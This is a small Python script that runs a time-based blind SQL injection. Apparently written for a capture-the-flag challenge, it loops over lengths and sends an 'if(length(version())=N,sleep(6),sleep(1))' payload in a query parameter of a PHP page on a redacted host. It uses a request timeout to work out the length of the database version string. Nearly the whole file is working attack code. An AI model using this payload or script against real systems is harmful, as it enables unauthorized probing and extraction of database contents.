import requests


dicts = '0123456789abcdefghijklmnopqrstuvwsyz'
number = range(1,31)

#url = 'http://chall.tasteless.eu/level1/index.php?dir=|(0)%2b1'

#content0 = requests.get(url).content

database = ''
for i in number:
	database0 = str(i)
	#print database0
	url1 = 'http://xxx.xxxxxxxx.xxx/xampp/cds.php?interpret=1&jahr=if(length(version())='+database0+',sleep(6),sleep(1))&titel=222'
	try:
		response = requests.get(url1,timeout=5)
	
	except requests.exceptions.RequestException as e:
		#database = database + i
		#database0=str(i)
		print database0
		break
print database0
